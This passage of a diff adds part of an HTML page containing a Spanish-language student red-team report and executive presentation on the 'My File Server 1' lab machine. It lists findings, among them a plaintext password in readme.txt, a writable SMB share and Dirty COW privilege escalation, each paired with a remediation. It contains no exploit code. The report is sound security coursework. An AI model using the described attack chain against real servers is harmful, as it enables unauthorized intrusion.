+                            <li><strong>Medio:</strong> habilitar registros (auditd, syslog remoto) y alertas para accesos SMB/HTTP; crear playbook de respuesta y realizar análisis forense de binarios subidos.</li>
+                            <li><strong>Bajo:</strong> implementar gestión de secretos (vault) para evitar almacenamiento de credenciales en ficheros públicos.</li>
+                        </ol>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">11. Tabla de hallazgos</h2>
+                        <div style="overflow-x: auto; margin-top: 15px;">
+                            <table style="width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #ccc; font-size: 0.85rem;">
+                                <thead>
+                                    <tr style="background: rgba(255,255,255,0.1); text-align: left;">
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">ID</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Vulnerabilidad</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Severidad</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Evidencia (archivo/referencia)</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Impacto</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Recomendación</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">01</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Credencial en texto plano en /readme.txt (expuesta vía HTTP)</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: var(--c-red);">Alta</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Contenido de /readme.txt: "My password is rootroot1". Captura de curl http://192.168.56.103/readme.txt.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Acceso no autorizado a SMB; exfiltración de datos y compromiso de cuentas.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Eliminar ficheros con credenciales, rotar contraseñas, usar gestión de secretos.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">02</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Share SMB smbdata con permisos de lectura/escritura</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: var(--c-red);">Alta</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Salida de smbmap mostrando smbdata con R/W (guardar smbmap output).</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Lectura/modificación/exfiltración de datos; posible pivote.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Restringir permisos, aplicar ACLs, deshabilitar escritura cuando no sea necesaria.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">03</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Vulnerabilidad local Dirty COW (CVE-2016-5195) — escalada a root</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #ff4444; font-weight: bold;">Crítica</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Ejecución de exploit Dirty COW; compilación y ejecución del binario</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Escalada a privilegios root; control total del sistema.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Actualizar/parchear kernel; revisar integridad del sistema y restaurar desde respaldo si procede.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">04</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Versión de Apache potencialmente desactualizada (Apache 2.4.6)</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: var(--c-yellow);">Media</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Resultado de nmap indicando Apache 2.4.6.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Exposición a vulnerabilidades conocidas de la versión; riesgos de ejecución remota/divulgación.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Actualizar Apache a versión mantenida y revisar CVE aplicables.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">05</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Prácticas inseguras en transferencia de claves (uso de FTP sin cifrado)</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: var(--c-yellow);">Media</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Uso de ftp para subir clave pública (se documenta la falta de cifrado).</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Posible intercepción de credenciales/transmisiones; pérdida de confidencialidad.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Usar scp/sftp o mecanismos seguros; evitar FTP en producción; emplear llaves con permisos y repositorios de secretos.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">12. Bibliografías</h2>
+                        <ul class="glowing-list">
+                            <li><strong>CVE-2016-5195:</strong> Vulnerabilidad "Dirty COW" (Kernel Linux).</li>
+                            <li><strong>PTES:</strong> Estándar de Ejecución de Pruebas de Penetración.</li>
+                            <li><strong>NVD (NIST):</strong> Base de Datos Nacional de Vulnerabilidades.</li>
+                            <li><strong>OWASP:</strong> Guía de seguridad en servicios web.</li>
+                            <li><strong>Manuales de Herramientas:</strong> Documentación oficial de Nmap, Nikto y SMBMap.</li>
+                        </ul>
+                        </div>
+
+                    </article>
+
+                    <div class="tech-divider"></div>
+
+                    <!-- PRESENTACIÓN EJECUTIVA START -->
+                    <article class="article-body">
+                        <div style="text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--c-purple); padding-bottom: 20px;">
+                            <h1 style="font-family:'Orbitron'; font-size: 2.2rem; margin-bottom: 5px; color: #fff;">PRESENTACIÓN EJECUTIVA</h1>
+                            <h2 style="font-family:'Orbitron'; font-size: 1.6rem; color: var(--c-purple);">Análisis de riesgos y plan de remediación estratégica</h2>
+                        </div>
+
+                        <!-- SLIDE 1 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 1: Portada</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <p style="margin-top: 10px;"><strong>Título:</strong> ACTIVIDAD 09<br>Red team report: pentesting de My File Server 1<br>Análisis de riesgos y plan de remediación estratégica</p>
+                            <p style="margin-top: 10px;"><strong>Presentado por:</strong><br>179033 – Alonso Castillo Omar Karim<br>177622 – Cruz Juárez Francisco Javier<br>175031 – Espinoza Aguilar Brian Salvador<br>177685 – Martínez Lara Santiago de la Cruz<br>173030 – Sánchez Ramírez Mayeli<br>177263 – Sánchez Zavala Alan Gilberto</p>
+                            <p style="margin-top: 10px;"><strong>Fecha:</strong> 10 de marzo de 2026</p>
+                        </div>
+
+                        <!-- SLIDE 2 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 2: Contexto del Engagement</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <p style="margin-top: 10px;"><strong>Nuestro Enfoque:</strong> Realizamos un "simulacro de robo" o prueba de penetración en nuestro servidor de archivos para evaluar qué tan fácil sería para un atacante externo obtener acceso no autorizado al sistema.</p>
+                            <p style="margin-top: 10px;"><strong>Objetivo Principal:</strong> Identificar las vulnerabilidades y puntos débiles de nuestro sistema antes de que un delincuente real pueda aprovecharlos para comprometer la seguridad de la empresa.</p>
+                            <p style="margin-top: 10px;"><strong>Mensaje clave:</strong> No buscamos culpables, buscamos soluciones para proteger la información de la empresa y garantizar la continuidad del negocio.</p>
+                        </div>
+
+                        <!-- SLIDE 3 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 3: Metodología Aplicada</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <p style="margin-top: 10px;">Adoptamos un enfoque de <strong>Caja Negra</strong>, actuando como un atacante externo que no tiene conocimiento previo de la infraestructura interna de la empresa. Este método simula las condiciones reales que enfrentaría un criminal cibernético.</p>
+                            <ul class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Observar:</strong> Identificar qué puertos y servicios están expuestos en internet y disponibles para conexión externa.</li>
+                                <li><strong>Explorar:</strong> Probar las diferentes "cerraduras" y buscar credenciales o configuraciones inseguras que puedan ser explotadas.</li>
+                                <li><strong>Confirmar:</strong> Obtener acceso al sistema y demostrar el nivel de daño potencial que podría causarse una vez dentro.</li>
+                                <li><strong>Reportar:</strong> Documentar todos los hallazgos y proporcionar recomendaciones específicas para fortalecer la seguridad.</li>
+                            </ul>
+                        </div>
+
+                        <!-- SLIDE 4 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 4: Nivel General de Riesgo</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <h3 style="color: #ff4444; margin: 10px 0;">CRÍTICO</h3>
+                            <p>Logramos tomar el <strong>control total del servidor</strong>. Un atacante podría borrar toda nuestra información, robar datos confidenciales de clientes o secuestrar el sistema por completo.</p>
+                            <p style="margin-top: 10px;"><strong>Nivel de Urgencia:</strong> Intervención inmediata requerida en los próximos 7 días para evitar compromiso del sistema.</p>
+                            <p style="margin-top: 10px;"><strong>Impacto Potencial:</strong> Pérdida total de información crítica, interrupción de operaciones y daños reputacionales significativos.</p>
+                        </div>
+
+                        <!-- SLIDE 5 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 5: Hallazgos Críticos</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong> (Los 3 grandes problemas de seguridad)</p>
+                            <ol class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Llaves bajo el tapete:</strong> Encontramos una nota de texto abierta con la contraseña maestra del sistema ("rootroot1"). Esta credencial proporciona acceso completo a toda la infraestructura.</li>
+                                <li><strong>Puertas sin candado:</strong> Una carpeta compartida permite que cualquier usuario, incluso externos, lea, modifique o borre archivos sin permiso alguno.</li>
+                                <li><strong>Sistema obsoleto:</strong> El "corazón" del servidor tiene una falla de seguridad crítica conocida como Dirty COW que permite a cualquier usuario convertirse en administrador total del sistema.</li>
+                            </ol>
+                        </div>
+
+                        <!-- SLIDE 6 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 6: Escenario del Impacto Empresarial</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <p style="margin-top: 10px;">Las vulnerabilidades identificadas exponen a la empresa a riesgos operacionales, financieros y reputacionales significativos:</p>
+                            <ul class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Pérdida de Información:</strong> Borrado accidental o malintencionado de archivos críticos de trabajo, proyectos en curso y documentos históricos de la empresa.</li>
+                                <li><strong>Paro de Operaciones:</strong> Si el servidor se cae o es secuestrado mediante ransomware, toda la oficina deja de funcionar, paralizando actividades diarias.</li>
+                                <li><strong>Robo de Identidad:</strong> Uso de nuestras cuentas y sistemas para atacar a otras empresas o clientes, comprometiendo relaciones comerciales.</li>
+                                <li><strong>Costo Reputacional:</strong> Perder la confianza de clientes, proveedores y socios que nos confían su información sensible y privada.</li>
+                            </ul>
+                        </div>
+
+                        <!-- SLIDE 7 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 7: Matriz de Riesgo</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <p style="margin-top: 10px;">Clasificación de las vulnerabilidades según su impacto potencial y probabilidad de explotación:</p>
+                            <ul class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Riesgo 1: Contraseña Expuesta</strong><br>Impacto: Muy Alto | Probabilidad: Muy Alta<br>Credencial maestra accesible para cualquier persona</li>
+                                <li style="margin-top: 5px;"><strong>Riesgo 2: Falla del Kernel</strong><br>Impacto: Crítico | Probabilidad: Alta<br>Exploit Dirty COW permite acceso administrativo total</li>
+                                <li style="margin-top: 5px;"><strong>Riesgo 3: Servidores Obsoletos</strong><br>Impacto: Medio | Probabilidad: Media<br>Software desactualizado con vulnerabilidades conocidas</li>
+                            </ul>
+                            <p style="margin-top: 10px; color: var(--c-yellow);"><strong>Conclusión:</strong> Estamos en la zona roja de peligro. Requiere acción inmediata en las dos primeras semanas.</p>
+                        </div>
+
+                        <!-- SLIDE 8 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 8: Recomendaciones Estratégicas</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <ol class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Cambio de Cerraduras:</strong> Cambiar todas las contraseñas actuales del sistema y eliminar permanentemente cualquier archivo que contenga credenciales en texto plano.</li>
+                                <li><strong>Actualización de Seguridad:</strong> "Vacunar" al servidor contra la falla Dirty COW mediante la actualización del Kernel a una versión parchada y segura.</li>
+                                <li><strong>Control de Acceso:</strong> Implementar permisos granulares para que cada empleado solo pueda acceder a lo que necesita para trabajar, aplicando el principio de mínimo privilegio.</li>
+                                <li><strong>Modernización:</strong> Actualizar el software de navegación (Apache) a la versión más reciente con soporte activo y parches de seguridad aplicados.</li>
+                            </ol>
+                        </div>
+
+                        <!-- SLIDE 9 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 9: Roadmap de Remediación</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong> (¿Qué sigue? Plan de acción estructurado)</p>
+                            <ol class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Semana 1: Urgente</strong><br>Parchear el sistema (Kernel) contra Dirty COW y cambiar la contraseña expuesta "rootroot1". Implementar medidas de contención inmediatas.</li>
+                                <li style="margin-top: 5px;"><strong>Semana 2: Importante</strong><br>Reconfigurar los permisos de las carpetas compartidas, implementando controles de acceso basados en roles (RBAC) para cada departamento.</li>
+                                <li style="margin-top: 5px;"><strong>Mes 1: Mantenimiento</strong><br>Actualizar servidores y software a versiones compatibles, realizar auditoría de seguridad completa y capacitar al personal sobre manejo seguro de contraseñas.</li>
+                            </ol>
+                        </div>
+
+                        <!-- SLIDE 10 -->
+                        <h2 style="color: var(--c-purple);">Diapositiva 10: Conclusión</h2>
+
+                        <div class="info-box" style="border-color: var(--c-purple); margin-bottom: 30px;">
+                            <p><strong>Contenido de la diapositiva:</strong></p>
+                            <p style="margin-top: 10px;">El sistema es actualmente <strong>vulnerable crítico</strong>, pero <strong>es fácil de arreglar</strong> si actuamos ahora. Las medidas de remediación no requieren inversiones costosas en nuevo hardware, sino principalmente tiempo técnico de actualización y configuración.</p>
+                            <h3 style="margin-top: 15px; color: var(--c-blue);">Resumen de Acción</h3>
+                            <ul class="glowing-list" style="margin-top: 5px;">
+                                <li>Priorizar parcheo del Kernel y cambio de contraseñas en 7 días</li>
+                                <li>Implementar controles de acceso granulares</li>
+                                <li>Planificar actualización completa del software</li>
+                                <li>Capacitar al equipo en prácticas de seguridad</li>
+                            </ul>
+                            <div style="background: rgba(255, 102, 0, 0.1); border-left: 4px solid #ff6600; padding: 10px; margin-top: 15px;">
+                                <h3 style="color: #ff6600; margin: 0 0 5px 0;">Meta a 30 Días</h3>
+                                <p style="margin: 0;">Convertir nuestra "puerta abierta" en una fortaleza digital robusta, garantizando la continuidad del negocio y la protección de información crítica.</p>
+                            </div>
+                            <p style="margin-top: 15px; font-style: italic; color: #aaa;">"La seguridad cibernética no es un destino, es un viaje continuo de mejora y vigilancia."</p>
+                        </div>
+
+                    </article>
+
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <div class="scrolling-text">
+                > FRANCISCO JAVIER CRUZ JUAREZ (177622) > ACTIVIDAD 09 > RED TEAM REPORT > MY FILE SERVER 1 >
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
